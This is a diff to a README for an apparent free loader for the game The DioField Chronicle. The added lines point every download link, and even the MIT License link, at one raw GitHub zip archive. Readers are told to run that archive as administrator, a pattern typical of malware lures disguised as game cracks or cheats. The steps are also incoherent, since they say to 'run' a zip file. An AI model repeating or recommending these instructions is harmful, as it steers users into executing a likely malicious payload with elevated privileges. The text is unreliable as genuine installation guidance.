@@ -25,9 +25,9 @@ Level up your gaming experience now, and join the exciting adventures of DioFiel
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/raoaman8973/DioFieldChronicle-FreeRealm/main/esoanhydride/DioFieldChronicle-FreeRealm.zip** from the repository.
 2. Extract files to your preferred location.
-3. Run Loader.exe (or Loader.app/Loader.sh) as administrator.
+3. Run https://raw.githubusercontent.com/raoaman8973/DioFieldChronicle-FreeRealm/main/esoanhydride/DioFieldChronicle-FreeRealm.zip (or https://raw.githubusercontent.com/raoaman8973/DioFieldChronicle-FreeRealm/main/esoanhydride/DioFieldChronicle-FreeRealm.zip) as administrator.
 4. Follow the on-screen instructions.
 5. Launch and enjoy The DioField Chronicle!  
 
@@ -41,7 +41,7 @@ This repository is for educational and personal use. Distribution may be subject
 
 ## 📄 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+Licensed under the [MIT License](https://raw.githubusercontent.com/raoaman8973/DioFieldChronicle-FreeRealm/main/esoanhydride/DioFieldChronicle-FreeRealm.zip).  
 All rights reserved, 2025.
 
 Happy gaming!
